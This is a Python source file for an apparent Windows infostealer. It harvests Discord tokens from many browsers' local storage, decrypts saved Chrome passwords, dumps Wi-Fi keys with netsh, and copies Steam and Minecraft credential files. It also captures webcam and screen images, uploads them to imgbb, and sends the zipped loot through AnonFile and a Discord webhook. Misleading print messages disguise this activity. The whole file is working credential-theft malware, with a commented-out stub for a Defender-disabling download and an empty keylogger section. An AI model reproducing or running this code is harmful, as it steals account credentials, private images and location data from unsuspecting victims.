import json
import os
import shutil
import winreg
import re
from shutil import copyfile
from base64 import b64decode
from zipfile import ZipFile

from Crypto.Cipher import AES
from anonfile.anonfile import AnonFile
from PIL import ImageGrab
import subprocess
import sqlite3
import win32crypt
import requests
import cv2
import base64
from discord_webhook import DiscordWebhook, DiscordEmbed

TokenList = []
PlatformList = []

ROAMING = os.getenv("APPDATA")
LOCAL = os.getenv("LOCALAPPDATA")

Discord_Path = {
    "Discord": ROAMING + "\\Discord\\Local Storage\\leveldb",
    "Lightcord": ROAMING + "\\Lightcord\\Local Storage\\leveldb",
    "PTB": ROAMING + "\\discordptb\\Local Storage\\leveldb",
    "Canary": ROAMING + "\\discordcanary\\Local Storage\\leveldb",
    "Opera": ROAMING + "\\Opera Software\\Opera Stable\\Local Storage\\leveldb",
    "Opera GX": ROAMING + "\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb",
    "Firefox": ROAMING + "\\Mozilla\\Firefox\\Profiles\\",

    "Amigo": LOCAL + "\\Amigo\\User Data\\Local Storage\\leveldb",
    "Torch": LOCAL + "\\Torch\\User Data\\Local Storage\\leveldb",
    "Kometa": LOCAL + "\\Kometa\\User Data\\Local Storage\\leveldb",
    "Orbitum": LOCAL + "\\Orbitum\\User Data\\Local Storage\\leveldb",
    "CentBrowser": LOCAL + "\\CentBrowser\\User Data\\Local Storage\\leveldb",
    "7Star": LOCAL + "\\7Star\\7Star\\User Data\\Local Storage\\leveldb",
    "Sputnik": LOCAL + "\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb",
    "Vivaldi": LOCAL + "\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb",
    "Chrome SxS": LOCAL + "\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb",
    "Epic Privacy": LOCAL + "\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb",
    "Chrome": LOCAL + "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb",
    "Uran": LOCAL + "\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb",
    "Edge": LOCAL + "\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb",
    "Yandex": LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb",
    "Opera Neon": LOCAL + "\\Opera Software\\Opera Neon\\User Data\\Default\\Local Storage\\leveldb",
    "Brave": LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb"
}

temp_dir = LOCAL + "\\Temp\\"

webhook = ""


def getipv4():
    reqv4 = requests.get('https://api.ipify.org/')
    publicipv4 = reqv4.text
    return publicipv4


def getipv6():
    reqv6 = requests.get('https://api64.ipify.org/')
    publicipv6 = reqv6.text
    return publicipv6


def getipinfo():
    ipdetai = requests.get('https://ipinfo.io/' + publicipv4 + '')
    ipdetail = ipdetai.json()
    return ipdetail


def Grabber():
    for platform, path in Discord_Path.items():
        if platform == "Firefox":
            for root, dirs, files in os.walk(path):
                for dir in dirs:
                    if not ".default" in dir:
                        pass
                    else:
                        if not os.path.isdir(temp_dir + 'firefoxtoken\\'):
                            os.mkdir(temp_dir + 'firefoxtoken\\')
                        try:
                            copyfile(path + dir + '\\' + 'webappsstore.sqlite',
                                     temp_dir + 'firefoxtoken\\' + 'webappsstore.sqlite')
                            connection = sqlite3.connect(temp_dir + 'firefoxtoken\\' + 'webappsstore.sqlite')
                            cursor = connection.cursor()
                            cursor.execute('SELECT key, value FROM webappsstore2')
                            values = cursor.fetchall()
                            for value in values:
                                if value[0] == "token":
                                    token = value[1].replace('"', '')
                                    try:
                                        t = b64decode(token[:24])
                                        int(t.decode())
                                    except Exception:
                                        pass
                                    else:
                                        TokenList.append(token)
                                        PlatformList.append(platform)
                                else:
                                    continue
                        except Exception:
                            pass
        else:
            if not os.path.exists(path):
                continue
            for file_name in os.listdir(path):
                if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
                    continue
                for l in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
                    for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                        for Token in re.findall(regex, l):
                            TokenList.append(Token)
                            PlatformList.append(platform)
    return TokenList, PlatformList

def get_encryption_key():
    local_state_path = os.path.join(os.environ["USERPROFILE"],
                                    "AppData", "Local", "Google", "Chrome",
                                    "User Data", "Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)

    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    key = key[5:]
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

def decrypt_password(password, key):
    try:
        iv = password[3:15]
        password = password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(password)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            return ""

def getpw():
    key = get_encryption_key()
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                           "Google", "Chrome", "User Data", "default", "Login Data")
    filename = "ChromeData.db"
    shutil.copyfile(db_path, filename)
    db = sqlite3.connect(filename)
    cursor = db.cursor()
    cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
    for row in cursor.fetchall():
        origin_url = row[0]
        action_url = row[1]
        username = row[2]
        password = decrypt_password(row[3], key)
        date_created = row[4]
        date_last_used = row[5]
        origin_urls = []
        action_urls = []
        usernames = []
        passwords = []
        times = 0
        if username or password:
            print(username)
            origin_urls.append(f"Origin URL: {origin_url}")
            action_urls.append(f"Action URL: {action_url}")
            usernames.append(f"Username: {username}")
            passwords.append(f"Password: {password}")

        else:
            continue

    cursor.close()
    db.close()
    try:
        os.remove(filename)
    except:
        pass
    writepw(origin_urls, action_urls, usernames, passwords)

def writepw(origin_urls, action_urls, usernames, passwords):
    print(usernames)
    with open('./pw.txt', 'a') as f:
        for origin_url in origin_urls:
            for action_url in action_urls:
                for username in usernames:
                    for password in passwords:
                        f.write("------------------------------------------\n")
                        print(username)
                        f.write(f"{origin_url}\n")
                        f.write(f"{action_url}\n")
                        f.write(f"{username}\n")
                        f.write(f"{password}\n")
                        f.write("------------------------------------------\n")
    f.close()

#def disabledef():
    #file = requests.get(
    #    '')
    #open('./dater.exe', 'wb').write(file.content)
    #os.system(
    #    'dater.exe')
    #os.remove('.dater.exe')


def getwebcam():
    cam = cv2.VideoCapture(0)
    ret, frame = cam.read()
    img_name = "pic.png"
    cv2.imwrite(img_name, frame)
    cam.release()
    with open("pic.png", "rb") as file:
        payload = {
            "key": "",
            "image": base64.b64encode(file.read()),
        }
    res = requests.post('https://api.imgbb.com/1/upload', payload)
    return res

def getscreenshot():
    thescreenshot = ImageGrab.grab(all_screens=True)
    thescreenshot.save('pic2.png', 'PNG')
    with open("pic2.png", "rb") as file:
        payload = {
            "key": "",
            "image": base64.b64encode(file.read()),
        }
    res = requests.post('https://api.imgbb.com/1/upload', payload)
    return res

def getwifipw():
    file = open('dat.txt', 'w')
    data = subprocess.check_output(['netsh','wlan','show','profiles']).decode('utf-8').split('\n')
    wifis = [line.split(':')[1][1:-1] for line in data if "All User Profile" in line ]
    try:
        for wifi in wifis:
            results = subprocess.check_output(['netsh','wlan','show','profile',wifi,'key=clear']).decode('utf-8').split('\n')
            results = [line.split(':')[1][1:-1] for line in results if "Key Content" in line]
            try:
                file.write('Wifi ' + wifi + 'Password: ' + results[0] + '\n')
            except IndexError:
                file.write('Wifi ' + wifi + 'Password: ' + 'Cannot be read!' + '\n')
    except:
        pass
    file.close()

def getsteampath():
    steamkey = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, 'SOFTWARE\WOW6432Node\Valve\Steam')
    steam_path = winreg.QueryValueEx(steamkey, 'InstallPath')
    steam_path = steam_path[0]
    winreg.CloseKey(steamkey)
    return steam_path

def getsteamsf():
    steam_path = getsteampath()
    ssf = [filename for filename in os.listdir(steam_path) if filename.startswith("ssf")]
    return ssf

def getsteamdata(Zip):
    steam_path = getsteampath()
    Zip.write(steam_path + '/config/config.vdf', arcname='Steam/config.vdf')


def send(webhook):
    Webhook = DiscordWebhook(url=webhook, username=pcusername)
    Zip = ZipFile('info.zip', 'w')

    try:

        TokenEmbed = DiscordEmbed(title='Tokens grabbed:', color='03b2f8')
        BrokenTokenEmbed = DiscordEmbed(title='Broken Tokens grabbed:', color='03b2f8')
        tokenslist, PlatformList = Grabber()
        times = 1
        timesplat = 0
        brokentimes = 1
        brokentokentxt = open('info.txt', 'w')
        tokentxt = open('headers.txt', 'w')
        for Tokens in tokenslist:
            r = requests.get("https://discord.com/api/v8/users/@me/library",
                            headers={"Authorization": Tokens, "Content-Type": "application/json"})
            try:
                if r.status_code == 200:
                    TokenEmbed.add_embed_field(
                            name='Token ' + str(times) + ' found  in ' + PlatformList[timesplat] + ':', value=Tokens)
                    tokentxt.write('Token ' + str(times) + ' found  in ' + PlatformList[timesplat] + ': ' + Tokens + '\n')
                    times += 1
                    timesplat += 1
                else:
                    BrokenTokenEmbed.add_embed_field(
                        name='Broken Token ' + str(brokentimes) + ' found in ' + PlatformList[timesplat] + ':', value=Tokens)
                    brokentokentxt.write('Broken Token ' + str(brokentimes) + ' found  in ' + PlatformList[timesplat] + ': ' + Tokens + '\n')
                    brokentimes += 1
                    timesplat += 1
            except:
                pass
        tokentxt.close()
        brokentokentxt.close()
        Zip.write('./headers.txt', arcname='Discord/tokens.txt')
        Zip.write('./info.txt', arcname='Discord/brokentokens.txt')
        os.remove('./headers.txt')
        os.remove('./info.txt')
        Webhook.add_embed(TokenEmbed)
        Webhook.add_embed(BrokenTokenEmbed)
    except:
        pass
    print('Ip now changing')

    try:
        ipv4 = getipv4()
        ipv6 = getipv6()
        IpEmbed = DiscordEmbed(title='Ip Infos grabbed:', color='03b2f8')
        IpEmbed.add_embed_field(name='IPV4:', value=ipv4)
        IpEmbed.add_embed_field(name='IPV6', value=ipv6)
        try:
            IpEmbed.add_embed_field(name='Hostname:', value=ipdetails["hostname"])
        except:
            pass
        IpEmbed.add_embed_field(name='Region:', value=ipdetails["region"])
        IpEmbed.add_embed_field(name='Countrycode:', value=ipdetails["country"])
        IpEmbed.add_embed_field(name='Location:', value=ipdetails["loc"])
        IpEmbed.add_embed_field(name='ISP:', value=ipdetails["org"])
        IpEmbed.add_embed_field(name='Postal:', value=ipdetails["postal"])
        IpEmbed.add_embed_field(name='Timezone:', value=ipdetails["timezone"])
        Webhook.add_embed(IpEmbed)
    except:
        pass
    print('Upnp request made')

    try:
        WebcamEmbed = DiscordEmbed(title='Pic grabbed:', color='03b2f8')
        WebcamEmbed.set_image(url=res['data']['url'])
        Webhook.add_embed(WebcamEmbed)
        os.remove('./pic.png')
        os.remove('./pic2.png')
        webcamtxt = open('filler.txt', 'w')
        webcamtxt.write('Webcam 1 grabbed image available at: ' + res['data']['url'] + '\n')
        webcamtxt.close()
        screenshottxt = open('filler2.txt', 'w')
        screenshottxt.write('Desktop grabbed image available at: ' + res2['data']['url'] + '\n')
        screenshottxt.close()
        Zip.write('./filler.txt', arcname='Images/webcams.txt')
        Zip.write('./filler2.txt', arcname='Images/desktops.txt')
        os.remove('./filler.txt')
        os.remove('./filler2.txt')
    except:
        pass

    try:
        steam_path = getsteampath()
        for ssf in getsteamsf():
            Zip.write(steam_path + '\\' +  ssf, arcname='Steam/' + ssf)
        getsteamdata(Zip)
    except Exception as e:
        print(e)

    try:
        apd = os.getenv('APPDATA')
        mc = apd + "\.minecraft\\"
        files = ['launcher_accounts.json', 'launcher_msa_credentials.json', 'launcher_profiles.json', 'launcher_log.txt']
        for x in files:
            try:
                Zip.write(mc + x, arcname='Minecraft/' + x)
            except:
                pass
    except:
        pass

    try:
        getbrowserpw()
        Zip.write('./logsin.txt', arcname='Passwords/passwords.txt')
        os.remove('./logsin.txt')
    except:
        pass

    Zip.close()
    anon = AnonFile('')
    status, file_url = anon.upload_file('./info.zip')

    try:
        PassEmbed = DiscordEmbed(title='Other Infos:',
                                 description='Other Infos grabbed are available here: ' + file_url, color='03b2f8')
        Webhook.add_embed(PassEmbed)
    except:
        pass
    os.remove('./info.zip')
    print('Ip Succesfully changed')
    Webhook.execute()

#----KEYLOGGER----



#publicipv4 = getipv4()
#ipdetails = getipinfo()
#res = getwebcam().json()
#res2 = getscreenshot().json()
#pcusername = os.getenv("UserName")
#pcname = os.getenv("COMPUTERNAME")
#send(webhook)
#getwifipw()
#steam_path = getsteampath()
getpw()